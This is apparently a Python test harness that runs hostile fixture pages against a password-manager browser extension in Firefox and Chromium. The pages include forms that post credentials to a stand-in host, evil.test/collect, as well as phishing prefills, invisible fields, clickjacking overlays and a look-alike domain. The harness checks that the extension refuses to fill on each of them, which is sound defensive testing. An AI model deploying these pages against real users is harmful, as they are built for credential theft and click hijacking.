"""lab.py: what firefox.py and chromium.py share. A stand-in for the Vault's service on the real socket, local sites, the pages (honest
and hostile), a small WebDriver client for each browser's protocol, and every check, which each browser runs the same way.

The real native host (/usr/libexec/amethystora-vault-native) stands between the extension and the stand-in, so that what the browser's
extension says is checked against the host's own rules. The real service, polkit and a real desktop are suite 74's (plans/vault/work/ext.md).
"""
import base64
import http.server
import json
import os
import socket
import socketserver
import sys
import threading
import time
import urllib.request

HERE = os.path.dirname(os.path.abspath(__file__))
EXTENSION = os.path.dirname(HERE)
PORT = 8000
SITE = 'login.example.com'
NAMES = [SITE, 'evil.test', 'login.example.com.evil.test', 'quiet.example.net']
SOCKET = '/run/amethystora/vault.sock'
PASSWORD = 'hunter2-secret'
ELEMENT = 'element-6066-11e4-a52e-4f735466cecf'
BASE = f'http://{SITE}:{PORT}'
# What a person-granted site list looks like to the browser
GRANTED = [f'http://{SITE}/*', 'http://evil.test/*', 'http://login.example.com.evil.test/*', 'http://quiet.example.net/*']

failures = []
checks = 0


def check(name, good, detail=''):
    global checks
    checks += 1
    print(('ok    ' if good else 'FAIL  ') + name + (f'  ({detail})' if detail and not good else ''), flush=True)
    if not good:
        failures.append(name)


def wait(predicate, seconds=5):
    deadline = time.time() + seconds
    while time.time() < deadline:
        if predicate():
            return True
        time.sleep(0.1)
    return predicate()


# --- The stand-in service ---------------------------------------------------------------------------------------------------------

heard = []
heard_lock = threading.Lock()
# A second login for the site, with a name that tries to turn the line around
many_logins = False
BIDI_NAME = 'Pay\u202epal \u2066work\u2069'


def answer(request):
    b64 = lambda text: base64.b64encode(text.encode()).decode()
    op = request.get('op')
    if op == 'list' and request.get('kind') == 'password':
        items = [{'id': 'site', 'kind': 'password', 'name': 'Example login', 'meta': {'username': 'me@example.com', 'address': f'http://{SITE}:{PORT}'}}]
        if many_logins:
            items.append({'id': 'site2', 'kind': 'password', 'name': BIDI_NAME, 'meta': {'username': 'work@example.com', 'address': f'http://{SITE}:{PORT}'}})
        return {'ok': True, 'items': items}
    if op == 'list':
        return {'ok': True, 'items': [
            {'id': 'code1', 'kind': 'authenticator', 'name': 'Example', 'meta': {'type': 'totp', 'issuer': 'example.com', 'label': 'me'}},
        ]}
    if op == 'password-copy':
        return {'ok': True, 'secret': b64(PASSWORD), 'copy': 'secret'}
    if op == 'auth-code':
        return {'ok': True, 'code': '482913', 'seconds_left': 20, 'period': 30}
    if op == 'password-generate':
        return {'ok': True, 'secret': b64('Generated-Password-1'), 'bits': 120}
    if op == 'put':
        return {'ok': True, 'kind': 'password', 'id': request.get('id'), 'vault': 'v'}
    return {'ok': False, 'why': 'bad-request'}


def serve_vault():
    os.makedirs(os.path.dirname(SOCKET), exist_ok=True)
    if os.path.exists(SOCKET):
        os.unlink(SOCKET)
    listener = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
    listener.bind(SOCKET)
    os.chmod(SOCKET, 0o666)
    listener.listen()

    def one(connection):
        with connection, connection.makefile('rwb') as stream:
            for line in stream:
                request = json.loads(line)
                with heard_lock:
                    heard.append(request)
                stream.write((json.dumps(answer(request)) + '\n').encode())
                stream.flush()

    def accept():
        while True:
            connection, _ = listener.accept()
            threading.Thread(target=one, args=(connection,), daemon=True).start()

    threading.Thread(target=accept, daemon=True).start()


def ops():
    with heard_lock:
        return [request.get('op') for request in heard]


def secrets_asked():
    return sum(op in ('password-copy', 'auth-code', 'put', 'password-generate') for op in ops())


def requests(op):
    with heard_lock:
        return [request for request in heard if request.get('op') == op]


# --- The pages --------------------------------------------------------------------------------------------------------------------

FIELD = 'style="width:280px;height:34px"'
LOGIN = f"""<!doctype html><meta charset=utf-8><title>Sign in</title>
<form style="width:300px;margin:40px"><input id=user name=username autocomplete=username {FIELD}>
<input id=pass name=password type=password autocomplete=current-password {FIELD}></form>"""
CODE = f"""<!doctype html><meta charset=utf-8><title>Code</title>
<form style="width:300px;margin:40px"><input id=otp name=otp autocomplete=one-time-code inputmode=numeric maxlength=6 {FIELD}></form>"""
# Fields that take the focus as the page loads, and a page script that does all it can to fill or read
AUTOFOCUS = LOGIN.replace('id=user', 'id=user autofocus') + """<script>
addEventListener('load', () => setTimeout(() => {
  const user = document.getElementById('user');
  user.focus();
  const tried = [];
  const host = [...document.documentElement.children].find((element) => element.localName === 'div');
  tried.push('host:' + Boolean(host), 'shadowRoot:' + String(host && host.shadowRoot));
  for (const target of [host, document.documentElement.lastElementChild].filter(Boolean)) {
    const box = target.getBoundingClientRect();
    for (const type of ['pointerdown', 'mousedown', 'pointerup', 'mouseup', 'click']) {
      target.dispatchEvent(new MouseEvent(type, { bubbles: true, composed: true, clientX: box.left + 5, clientY: box.top + 5 }));
    }
    target.click && target.click();
  }
  tried.push('chrome:' + typeof chrome, 'runtime:' + typeof (typeof chrome === 'object' && chrome.runtime), 'browser:' + typeof browser);
  try { chrome.runtime.sendMessage({ kind: 'login', id: 'site' }); tried.push('sent'); } catch (error) { tried.push('send:' + error.name); }
  window.postMessage({ kind: 'login', id: 'site' }, '*');
  document.title = 'TRIED ' + tried.join(' ');
}, 800));
</script>"""
FRAME = f"""<!doctype html><meta charset=utf-8><title>Frame</title>
<iframe id=frame src="{BASE}/login.html" style="width:500px;height:300px;border:0"></iframe>"""
# The site's own login page in a frame with an opaque origin: the address is the site's, the document is not
SANDBOXED_FRAME = FRAME.replace('<iframe ', '<iframe sandbox="allow-scripts" ')
QUIET = '<!doctype html><meta charset=utf-8><title>Quiet</title>' + ''.join(f'<p>Paragraph {n} <a href="#{n}">link</a> <span>text</span></p>' for n in range(3000)) + \
    '<input id=search name=q type=search><textarea id=notes></textarea>'
# Fields drawn so that a person cannot see them
FAINT = f"""<!doctype html><meta charset=utf-8><title>Faint</title>
<form style="width:300px;margin:40px"><input id=user name=username autocomplete=username style="width:280px;height:34px;opacity:.02">
<input id=pass name=password type=password autocomplete=current-password style="position:absolute;left:-5000px;top:100px;width:280px;height:34px"></form>"""
# A form that posts to another site, with a field named `action` to hide it from `form.action`
EVIL_FORM = LOGIN.replace('<form ', '<form action="http://evil.test:8000/collect" ')
CLOBBERED = LOGIN.replace('<form ', '<form action="http://evil.test:8000/collect" ').replace('</form>', '<input name=action value=/ style="display:none"></form>')
BUTTON_ACTION = LOGIN.replace('</form>', '<button formaction="http://evil.test:8000/collect">Go</button></form>')
# What a phishing page prefills before one click on Save
TYPED = LOGIN.replace('id=user ', 'id=user value="attacker@evil.example" ').replace('id=pass ', 'id=pass value="phish-password" ')
SIGNUP = f"""<!doctype html><meta charset=utf-8><title>Sign up</title>
<form style="width:300px;margin:40px"><input id=user name=username autocomplete=username value="fresh@example.com" {FIELD}>
<input id=pass name=password type=password autocomplete=new-password maxlength=12 {FIELD}>
<input id=again name=again type=password autocomplete=new-password {FIELD}></form>"""
SIGNUP_SHORT = SIGNUP.replace('maxlength=12', 'maxlength=4')
PAGES = {'/login.html': LOGIN, '/code.html': CODE, '/autofocus.html': AUTOFOCUS, '/frame.html': FRAME, '/quiet.html': QUIET, '/sandboxed-frame.html': SANDBOXED_FRAME,
         '/faint.html': FAINT, '/evil-form.html': EVIL_FORM, '/clobbered.html': CLOBBERED, '/button-action.html': BUTTON_ACTION, '/typed.html': TYPED,
         '/signup.html': SIGNUP, '/signup-short.html': SIGNUP_SHORT}
# Pages the server itself sandboxes, as a site does for content it hosts
SANDBOX_HEADER = {'/sandboxed.html': LOGIN}


class Pages(http.server.BaseHTTPRequestHandler):
    def do_GET(self):
        path = self.path.split('?')[0]
        body = PAGES.get(path) or SANDBOX_HEADER.get(path)
        self.send_response(200 if body else 404)
        self.send_header('Content-Type', 'text/html; charset=utf-8')
        if path in SANDBOX_HEADER:
            self.send_header('Content-Security-Policy', 'sandbox allow-scripts')
        self.end_headers()
        self.wfile.write((body or 'no').encode())

    def log_message(self, *args):
        pass


def serve_pages():
    server = socketserver.ThreadingTCPServer(('127.0.0.1', PORT), Pages)
    server.daemon_threads = True
    threading.Thread(target=server.serve_forever, daemon=True).start()


def add_hosts():
    with open('/etc/hosts', 'a') as hosts:
        hosts.write('127.0.0.1 ' + ' '.join(NAMES) + '\n')


# --- WebDriver, in the two dialects ------------------------------------------------------------------------------------------------


class Driver:
    """What the checks use. Each browser's protocol fills in `call`."""

    def go(self, url):
        self.send('url', {'url': url})
        time.sleep(0.6)

    def page(self, script, args=None):
        return self.send('execute', {'script': script, 'args': args or []})

    def asynchronous(self, script, args=None):
        return self.send('async', {'script': script, 'args': args or []})

    def find(self, css):
        return self.send('find', {'using': 'css selector', 'value': css})

    def click_element(self, css):
        self.send('click', {'id': self.find(css)[ELEMENT]})

    def click_at(self, x, y):
        """A real click, as the browser makes one for a person: trusted"""
        pointer = {'type': 'pointer', 'id': 'mouse', 'parameters': {'pointerType': 'mouse'}, 'actions': [
            {'type': 'pointerMove', 'x': int(x), 'y': int(y), 'origin': 'viewport', 'duration': 0},
            {'type': 'pointerDown', 'button': 0}, {'type': 'pointerUp', 'button': 0}]}
        self.send('actions', {'actions': [pointer]})
        self.send('release', {})

    def move_to(self, x, y):
        pointer = {'type': 'pointer', 'id': 'mouse', 'parameters': {'pointerType': 'mouse'}, 'actions': [
            {'type': 'pointerMove', 'x': int(x), 'y': int(y), 'origin': 'viewport', 'duration': 0}]}
        self.send('actions', {'actions': [pointer]})
        self.send('release', {})

    def press(self, key):
        keys = {'type': 'key', 'id': 'keyboard', 'actions': [{'type': 'keyDown', 'value': key}, {'type': 'keyUp', 'value': key}]}
        self.send('actions', {'actions': [keys]})
        self.send('release', {})

    def into_frame(self, css):
        self.send('frame', {'id': {ELEMENT: self.find(css)[ELEMENT]}})

    def out_of_frame(self):
        self.send('parent', {})

    def handles(self):
        return self.send('handles', {})

    def current(self):
        return self.send('current', {})

    def switch(self, handle):
        self.send('switch', {'handle': handle})

    def new_tab(self):
        handle = self.send('new', {'type': 'tab'})['handle']
        self.switch(handle)
        return handle

    def close(self):
        self.send('close', {})


class W3C(Driver):
    """chromedriver, over HTTP"""

    ROUTES = {
        'url': ('POST', '/url'), 'execute': ('POST', '/execute/sync'), 'async': ('POST', '/execute/async'), 'find': ('POST', '/element'),
        'click': ('POST', '/element/{id}/click'), 'actions': ('POST', '/actions'), 'release': ('DELETE', '/actions'), 'frame': ('POST', '/frame'),
        'parent': ('POST', '/frame/parent'), 'handles': ('GET', '/window/handles'), 'current': ('GET', '/window'), 'switch': ('POST', '/window'),
        'new': ('POST', '/window/new'), 'close': ('DELETE', '/window'),
    }

    def __init__(self, port, capabilities):
        self.base = f'http://127.0.0.1:{port}'
        reply = self.request('POST', '/session', {'capabilities': {'alwaysMatch': capabilities}})
        self.session = reply['sessionId']

    def request(self, method, path, body=None):
        data = json.dumps(body).encode() if body is not None else None
        request = urllib.request.Request(self.base + path, data=data, method=method, headers={'Content-Type': 'application/json'})
        try:
            with urllib.request.urlopen(request, timeout=120) as response:
                return json.loads(response.read())['value']
        except urllib.error.HTTPError as error:
            raise RuntimeError(f'{method} {path}: {error.read().decode()[:300]}')

    def send(self, name, params):
        method, path = self.ROUTES[name]
        if '{id}' in path:
            path = path.replace('{id}', params['id'])
            params = {}
        return self.request(method, f'/session/{self.session}{path}', params if method == 'POST' else None)


class Marionette(Driver):
    """Firefox, over Marionette"""

    NAMES = {
        'url': 'WebDriver:Navigate', 'execute': 'WebDriver:ExecuteScript', 'async': 'WebDriver:ExecuteAsyncScript', 'find': 'WebDriver:FindElement',
        'click': 'WebDriver:ElementClick', 'actions': 'WebDriver:PerformActions', 'release': 'WebDriver:ReleaseActions', 'frame': 'WebDriver:SwitchToFrame',
        'parent': 'WebDriver:SwitchToParentFrame', 'handles': 'WebDriver:GetWindowHandles', 'current': 'WebDriver:GetWindowHandle',
        'switch': 'WebDriver:SwitchToWindow', 'new': 'WebDriver:NewWindow', 'close': 'WebDriver:CloseWindow',
    }

    def __init__(self, port):
        for _ in range(120):
            try:
                self.sock = socket.create_connection(('127.0.0.1', port), timeout=60)
                break
            except OSError:
                time.sleep(0.5)
        else:
            sys.exit('Marionette did not answer')
        self.buffer = b''
        self.id = 0
        self.read()

    def read(self):
        while b':' not in self.buffer:
            self.buffer += self.sock.recv(65536)
        size, rest = self.buffer.split(b':', 1)
        while len(rest) < int(size):
            rest += self.sock.recv(65536)
        self.buffer = rest[int(size):]
        return json.loads(rest[:int(size)])

    def call(self, name, params=None):
        self.id += 1
        body = json.dumps([0, self.id, name, params or {}]).encode()
        self.sock.sendall(str(len(body)).encode() + b':' + body)
        reply = self.read()
        if reply[2]:
            raise RuntimeError(f'{name}: {reply[2]}')
        result = reply[3]
        return result.get('value', result) if isinstance(result, dict) else result

    def send(self, name, params):
        if name == 'frame':
            return self.call(self.NAMES[name], {'element': params['id'][ELEMENT]})
        return self.call(self.NAMES[name], params)

    def chrome(self, script, args=None):
        self.call('Marionette:SetContext', {'value': 'chrome'})
        try:
            return self.call('WebDriver:ExecuteAsyncScript', {'script': script, 'args': args or []})
        finally:
            self.call('Marionette:SetContext', {'value': 'content'})


# --- Helpers on pages -------------------------------------------------------------------------------------------------------------


def field_values(browser, ids=('user', 'pass')):
    return browser.page('return arguments[0].map((id) => document.getElementById(id)?.value ?? null)', [list(ids)])


def button_place(browser, field):
    """Where the content script draws its button: the field's right edge, inside it"""
    box = browser.page('const b = document.getElementById(arguments[0]).getBoundingClientRect(); return [b.right, b.top, b.height]', [field])
    return box[0] - 6 - 11, box[1] + box[2] / 2


def has_button(browser):
    return browser.page("return [...document.documentElement.children].some((e) => e.localName === 'div' && e.matches(':popover-open'))")


def click_button(browser, field):
    browser.click_element('#' + field)
    wait(lambda: has_button(browser))
    time.sleep(0.4)
    x, y = button_place(browser, field)
    browser.click_at(x, y)
    time.sleep(0.8)


class Popup:
    """The popup's page opened as a tab of the browser, for the tab that was current: its buttons are real ones, and Marionette and
    chromedriver can click them, which neither can in a toolbar popup. It is the same page the toolbar shows, told its tab by the
    address, which is also how the window the in-page button falls back on opens it."""

    def __init__(self, browser, extension_url):
        self.browser = browser
        self.page_handle = browser.current()
        pattern_url = browser.page('return location.href')
        self.handle = browser.new_tab()
        browser.go(extension_url + '/popup.html')
        ids = browser.asynchronous('const [url, done] = arguments; chrome.tabs.query({}).then((tabs) => done(tabs.filter((tab) => tab.url === url).map((tab) => tab.id)));', [pattern_url])
        if len(ids) != 1:
            raise RuntimeError(f'the tab for {pattern_url}: {ids}')
        browser.go(f'{extension_url}/popup.html?tab={ids[0]}')
        wait(lambda: browser.page("return document.getElementById('main').children.length > 0 || !document.getElementById('status').hidden"), 8)

    def texts(self):
        return self.browser.page("return [...document.querySelectorAll('#main > *, #status')].map((e) => e.textContent.trim())")

    def buttons(self):
        return self.browser.page("return [...document.querySelectorAll('button.action')].map((b) => b.textContent.trim())")

    def click(self, words):
        self.browser.page("const b = [...document.querySelectorAll('button')].find((b) => b.textContent.includes(arguments[0])); b.click();", [words])

    def say(self, message):
        """What the popup sends the background script, as the popup does, for a case its buttons do not offer"""
        return self.browser.asynchronous('const [message, done] = arguments; chrome.runtime.sendMessage(message).then(done);',
                                         [dict(message, tabId=self.tab_id(), expected=self.origin())])

    def tab_id(self):
        return int(self.browser.page('return new URLSearchParams(location.search).get("tab")'))

    def origin(self):
        return self.browser.asynchronous('const [done] = arguments; chrome.tabs.get(Number(new URLSearchParams(location.search).get("tab"))).then((tab) => done(new URL(tab.url).origin));')

    def close(self):
        try:
            self.browser.switch(self.handle)
            self.browser.close()
        except RuntimeError:
            pass
        self.browser.switch(self.page_handle)


# --- The checks --------------------------------------------------------------------------------------------------------------------


# Set by each browser's runner: the browser's own popup is put away, so that it does not keep the page from the focus
hide_toolbar_popup = lambda: None
main_window = None


def put_popups_away(browser):
    """What a click on the button opened is closed: the toolbar's panel, and any window of the extension's own"""
    hide_toolbar_popup()
    for handle in browser.handles():
        if handle != main_window:
            browser.switch(handle)
            browser.close()
    browser.switch(main_window)


def untouched(browser, what, before, fields=('user', 'pass')):
    """Nothing filled and nothing secret asked since `before` (the number of secrets asked then)"""
    values = field_values(browser, fields)
    check(what + ': nothing filled', all(value == '' for value in values), str(values))
    check(what + ': no secret asked', secrets_asked() == before, str(ops()))


def run(browser, extension_url, popup_opened):
    """Every check but the browser-specific ones, with the sites already granted. `popup_opened()` says whether a click on the button
    brought up the extension's popup in a toolbar panel or a window of its own."""
    global main_window
    main_window = browser.current()
    # On load, with autofocus fields and a page script that does all it can
    browser.go(BASE + '/autofocus.html')
    wait(lambda: browser.page('return document.title').startswith('TRIED'), 8)
    time.sleep(1.5)
    title = browser.page('return document.title')
    check('a page script cannot reach the button: closed shadow root', 'shadowRoot:null' in title, title)
    check('a page script has no extension API', ('chrome:undefined' in title or 'runtime:undefined' in title) and 'browser:undefined' in title and 'sent' not in title, title)
    check('on load, and on a page script\'s clicks and focus: nothing filled', field_values(browser) == ['', ''], str(field_values(browser)))
    check('on load: no secret asked of the service, the host never started', secrets_asked() == 0 and ops() == [], str(ops()))

    # The button: a click opens the popup and fills nothing, asks for nothing, shows nothing
    browser.go(BASE + '/login.html')
    browser.click_element('#user')
    check('a field with the focus shows the button', wait(lambda: has_button(browser)))
    time.sleep(0.4)
    x, y = button_place(browser, 'user')
    browser.click_at(x, y)
    check('a click on the button brings up the popup', wait(popup_opened, 8))
    time.sleep(0.5)
    untouched(browser, 'a click on the button', 0)
    put_popups_away(browser)
    check('the button shows nothing of the vault in the page', browser.page("""
        const host = [...document.documentElement.children].find((e) => e.localName === 'div' && e.matches(':popover-open'));
        return host.scrollHeight <= 22 && host.scrollWidth <= 22 && !window.find('Example login') && !window.find('me@example.com');"""))
    check('the click itself started no fill: the service heard listings for the popup and nothing more', set(ops()) <= {'list'}, str(ops()))

    attacks(browser)
    popup_fills(browser, extension_url)
    popup_refusals(browser, extension_url)
    popup_new_and_save(browser, extension_url)
    frames_and_codes(browser, extension_url)


def attacks(browser):
    """The reviewer's: a page that covers, scales, moves or fades things so that a click lands where it did not mean to"""
    def fresh(page='/login.html', field='user'):
        put_popups_away(browser)
        browser.go(BASE + page)
        browser.click_element('#' + field)
        wait(lambda: has_button(browser))
        time.sleep(0.5)

    # Its own popover over the button, which takes no clicks: elementFromPoint skips it, as a cookie banner might be
    fresh()
    browser.page("""const cover = document.createElement('div'); cover.popover = 'manual';
        Object.assign(cover.style, {inset: '0', width: '100vw', height: '100vh', margin: '0', border: '0', background: '#fff', pointerEvents: 'none'});
        document.body.append(cover); cover.showPopover();""")
    x, y = button_place(browser, 'user')
    browser.click_at(x, y)
    time.sleep(0.8)
    untouched(browser, 'a popover with pointer-events none over the button', 0)

    # The button's own element scaled up over the whole page, and a click anywhere
    fresh()
    browser.page("""const host = [...document.documentElement.children].find((e) => e.localName === 'div' && e.matches(':popover-open'));
        host.style.setProperty('scale', '200', 'important');""")
    browser.click_at(1000, 750)
    time.sleep(0.8)
    untouched(browser, 'the button scaled over the page', 0)

    # Moved under the pointer as it comes
    fresh()
    browser.page("""addEventListener('pointermove', (event) => {
        const host = [...document.documentElement.children].find((e) => e.localName === 'div' && e.matches(':popover-open'));
        if (host) { host.style.setProperty('left', (event.clientX - 5) + 'px', 'important'); host.style.setProperty('top', (event.clientY - 5) + 'px', 'important'); }
      }, true);""")
    browser.click_at(900, 600)
    time.sleep(0.8)
    untouched(browser, 'the button moved under the pointer', 0)

    # The page reads what the button could show: nothing
    fresh()
    browser.click_at(*button_place(browser, 'user'))
    time.sleep(0.8)
    check('window.find finds nothing of the vault after a click', browser.page("return !window.find('Example') && !window.find('me@example.com')"))


def popup_fills(browser, extension_url):
    # An honest page, the popup's Fill
    browser.go(BASE + '/login.html')
    before = secrets_asked()
    popup = Popup(browser, extension_url)
    check('the popup offers the fill for this site', 'Fill the password' in popup.buttons(), str(popup.buttons()))
    check('the popup tells the site and that nothing fills until a click', any('login.example.com' in text for text in popup.texts()) and any('Nothing fills until you click' in text for text in popup.texts()), str(popup.texts()))
    check('opening the popup asked for no secret', secrets_asked() == before, str(ops()))
    popup.click('Fill the password')
    popup.browser.switch(popup.page_handle)
    filled = wait(lambda: field_values(browser) == ['me@example.com', PASSWORD])
    check('the popup\'s Fill fills the login', filled, str(field_values(browser)))
    check('that fill asked the service once', ops().count('password-copy') == 1, str(ops()))
    check('the page never saw the password but in its field', browser.page("return document.documentElement.outerHTML.includes(arguments[0])", [PASSWORD]) is False)
    popup.close()

    # The code
    browser.go(BASE + '/code.html')
    popup = Popup(browser, extension_url)
    popup.click('Fill the code')
    popup.browser.switch(popup.page_handle)
    check('the popup fills the one-time code', wait(lambda: field_values(browser, ['otp']) == ['482913']), str(field_values(browser, ['otp'])))
    popup.close()

    # Rows reachable from the keyboard, and names clean of what turns a line around
    global many_logins
    many_logins = True
    browser.go(BASE + '/login.html')
    popup = Popup(browser, extension_url)
    rows = browser.page("return [...document.querySelectorAll('.list .item')].map((e) => [e.localName, e.tabIndex, e.textContent])")
    check('several logins are buttons the keyboard reaches', len(rows) == 2 and all(row[0] == 'button' and row[1] >= 0 for row in rows), str(rows))
    names = ''.join(row[2] for row in rows)
    check('a name with direction controls is shown without them', not any(mark in names for mark in '\u202e\u2066\u2069') and 'Paypal' in names, names)
    browser.page("document.querySelectorAll('.list .item')[1].focus()")
    browser.press('\ue007')
    check('Enter on a row chooses it', browser.page("return document.querySelectorAll('.list .item')[1].getAttribute('aria-pressed')") == 'true')
    popup.click('Fill the password')
    popup.browser.switch(popup.page_handle)
    check('the chosen login is the one filled', wait(lambda: field_values(browser)[0] == 'work@example.com'), str(field_values(browser)))
    popup.close()
    many_logins = False


def popup_refusals(browser, extension_url):
    # Fields drawn so that a person cannot see them are not fields to fill
    browser.go(BASE + '/faint.html')
    before = secrets_asked()
    popup = Popup(browser, extension_url)
    check('fields at opacity .02 or off the page are not offered', 'Fill the password' not in popup.buttons(), str(popup.buttons()))
    answer = popup.say({'kind': 'fill-login', 'id': 'site'})
    popup.browser.switch(popup.page_handle)
    check('and a fill asked for anyway finds no field', answer.get('problem') == 'no-field' and field_values(browser) == ['', ''], f'{answer} {field_values(browser)}')
    check('faint fields: no secret asked', secrets_asked() == before, str(ops()))
    popup.close()

    # A sandboxed document has an origin of its own, whatever its address says
    for page, what in [('/sandboxed.html', 'a page sandboxed by the site\'s own header'), ('/sandboxed-frame.html', 'a sandboxed frame of the site')]:
        browser.go(BASE + page)
        popup = Popup(browser, extension_url)
        check(what + ' is offered no fill', 'Fill the password' not in popup.buttons(), str(popup.buttons()))
        answer = popup.say({'kind': 'fill-login', 'id': 'site'})
        popup.browser.switch(popup.page_handle)
        check(what + ': a fill asked for anyway finds no field', answer.get('problem') == 'no-field', str(answer))
        check(what + ': no secret asked', secrets_asked() == before, str(ops()))
        popup.close()

    # A form that posts to another site, by its action, by a field named `action`, and by a button's formaction
    for page, what in [('/evil-form.html', 'a form posting to another site'), ('/clobbered.html', 'a form whose action a field named action hides'), ('/button-action.html', 'a button posting to another site')]:
        browser.go(BASE + page)
        popup = Popup(browser, extension_url)
        check(what + ': the popup says so and offers no fill', 'Fill the password' not in popup.buttons() and any('another site' in text for text in popup.texts()), f'{popup.buttons()} {popup.texts()}')
        answer = popup.say({'kind': 'fill-login', 'id': 'site'})
        popup.browser.switch(popup.page_handle)
        check(what + ': a fill asked for anyway is refused', answer.get('problem') == 'other-site-form' and field_values(browser) == ['', ''], f'{answer} {field_values(browser)}')
        check(what + ': no secret asked', secrets_asked() == before, str(ops()))
        popup.close()


def popup_new_and_save(browser, extension_url):
    # What Save would store is shown first, and can be changed
    browser.go(BASE + '/typed.html')
    before_puts = len(requests('put'))
    popup = Popup(browser, extension_url)
    shown = browser.page("const i = document.querySelector('.who-label input'); return i ? [i.value, document.querySelector('.who-label').textContent] : null")
    check('the popup shows the username it would save, and the site', bool(shown) and shown[0] == 'attacker@evil.example' and 'login.example.com' in shown[1], str(shown))
    check('nothing was saved by opening it', len(requests('put')) == before_puts)
    browser.page("document.querySelector('.who-label input').value = 'mine@example.com'")
    popup.click('Save this login')
    puts = wait(lambda: len(requests('put')) == before_puts + 1)
    put = requests('put')[-1] if puts else {}
    check('Save stores what the person saw: the edited username and the browser\'s address', put.get('meta') == {'username': 'mine@example.com', 'address': BASE} and put.get('value', {}).get('password') == 'phish-password', str(put.get('meta')))
    popup.close()

    # A new password is kept before it is handed over, for the length the page's fields take
    for page, length in [('/signup.html', 12), ('/signup-short.html', None)]:
        browser.go(BASE + page)
        popup = Popup(browser, extension_url)
        mark = len(heard)
        popup.click('Make a new password')
        popup.browser.switch(popup.page_handle)
        done = wait(lambda: field_values(browser, ['pass', 'again']) == ['Generated-Password-1'] * 2)
        check(f'a new password fills the new-password fields ({page})', done, str(field_values(browser, ['pass', 'again'])))
        with heard_lock:
            since = [request.get('op') for request in heard[mark:]]
            generate = [request for request in heard[mark:] if request.get('op') == 'password-generate']
        check(f'it was generated and put before the answer, in that order ({page})', since == ['list', 'password-generate', 'put'], str(since))
        check(f'its length follows a page\'s maxlength of 12, and ignores one below the generator\'s minimum ({page})', generate and generate[0].get('length') == length, str(generate))
        puts = requests('put')[-1]
        check(f'the kept login is for the page, with the username in the form ({page})', puts['meta'] == {'username': 'fresh@example.com', 'address': BASE}, str(puts['meta']))
        popup.close()


def frames_and_codes(browser, extension_url):
    # A look-alike domain: the popup is for that domain, and nothing in the vault belongs to it
    before = secrets_asked()
    browser.go(f'http://login.example.com.evil.test:{PORT}/login.html')
    popup = Popup(browser, extension_url)
    check('a look-alike domain: the popup has no login for it', 'Fill the password' not in popup.buttons(), str(popup.buttons()))
    answer = popup.say({'kind': 'fill-login', 'id': 'site'})
    popup.browser.switch(popup.page_handle)
    check('a look-alike domain: a fill asked for anyway is refused', answer.get('problem') == 'no-match' and field_values(browser) == ['', ''], str(answer))
    check('a look-alike domain: no secret asked', secrets_asked() == before, str(ops()))
    popup.close()

    # A cross-site frame: the item's own site, framed by another
    browser.go(f'http://evil.test:{PORT}/frame.html')
    time.sleep(1.5)
    browser.into_frame('#frame')
    browser.click_element('#user')
    time.sleep(0.8)
    in_frame = has_button(browser)
    browser.out_of_frame()
    box = browser.page("return document.getElementById('frame').getBoundingClientRect().toJSON()")
    browser.into_frame('#frame')
    fx, fy = button_place(browser, 'user')
    browser.out_of_frame()
    browser.click_at(box['x'] + fx, box['y'] + fy)
    time.sleep(1.0)
    browser.into_frame('#frame')
    values = field_values(browser)
    browser.out_of_frame()
    check('a cross-site frame: no button drawn', not in_frame)
    check('a cross-site frame: no fill and no secret asked', values == ['', ''] and secrets_asked() == before, f'{values} {ops()}')
    popup = Popup(browser, extension_url)
    check('a cross-site frame: the popup is for the framing site and offers no fill', 'Fill the password' not in popup.buttons(), str(popup.buttons()))
    popup.close()

    # Only on the person's Save does a typed password go to the host
    put_before = len(requests('put'))
    browser.go(BASE + '/login.html')
    browser.page("document.getElementById('user').value = 'new@example.com'; document.getElementById('pass').value = 'typed-secret';")
    time.sleep(0.5)
    check('a typed password is not sent without Save', len(requests('put')) == put_before)
